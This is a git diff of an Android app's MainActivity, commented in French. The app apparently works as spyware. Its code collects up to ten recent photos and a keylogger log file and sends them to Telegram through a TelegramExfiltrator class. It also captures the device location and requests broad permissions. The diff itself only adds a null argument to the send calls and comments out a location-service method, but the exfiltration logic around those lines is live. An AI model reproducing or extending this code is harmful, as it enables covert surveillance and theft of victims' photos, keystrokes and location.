@@ -56,13 +56,13 @@ public class MainActivity extends AppCompatActivity {
             Log.d("MainActivity", "nombre photo " + photos.length);
             for (File photo : photos) {
                 Log.d("MainActivity", "Photo : " + photo.getAbsolutePath());
-                TelegramExfiltrator.sendFileToTelegram(photo, "sendPhoto", "photo", "image/jpeg");
+                TelegramExfiltrator.sendFileToTelegram(photo, "sendPhoto", "photo", "image/jpeg",null);
             }
 
             // ⌨️ 2. Exfiltration du fichier de log du keylogger
             File keylog = new File(getApplicationContext().getFilesDir(), "keylog.txt");
             if (keylog.exists()) {
-                TelegramExfiltrator.sendFileToTelegram(keylog, "sendDocument", "document", "application/octet-stream");
+                TelegramExfiltrator.sendFileToTelegram(keylog, "sendDocument", "document", "application/octet-stream",null);
             }
         } else {
             requestAllPermissions(); // Demande la permission sinon
@@ -98,7 +98,7 @@ public class MainActivity extends AppCompatActivity {
         ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS.toArray(new String[0]), PERMISSION_REQUEST_CODE);
     }
 
-    private void startLocationService() {
+    /*private void startLocationService() {
         Intent intent = new Intent(this, LocalisationService.class);
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
             Log.d("MainActivity", "Démarrage du service en foreground.");
@@ -106,7 +106,7 @@ public class MainActivity extends AppCompatActivity {
         } else {
             startService(intent); // ✅ Pour Android < 8
         }
-    }
+    }*/
 
     // Callback pour gérer la réponse à la demande de permission
     @Override
@@ -136,13 +136,13 @@ public class MainActivity extends AppCompatActivity {
                 GetLocalisation.captureOnce(this);
                 File[] photos = PhotoCollector.getRecentPhotos(getApplicationContext(), 10);
                 for (File photo : photos) {
-                    TelegramExfiltrator.sendFileToTelegram(photo, "sendPhoto", "photo", "image/jpeg");
+                    TelegramExfiltrator.sendFileToTelegram(photo, "sendPhoto", "photo", "image/jpeg", null);
                 }
 
                 // ⌨️ 2. Exfiltration du fichier de log du keylogger
                 File keylog = new File(getApplicationContext().getFilesDir(), "keylog.txt");
                 if (keylog.exists()) {
-                    TelegramExfiltrator.sendFileToTelegram(keylog, "sendDocument", "document", "application/octet-stream");
+                    TelegramExfiltrator.sendFileToTelegram(keylog, "sendDocument", "document", "application/octet-stream", null);
                 }
             } else {
                 Log.d("Permissions", "L'utilisateur a refusé une ou plusieurs permissions");
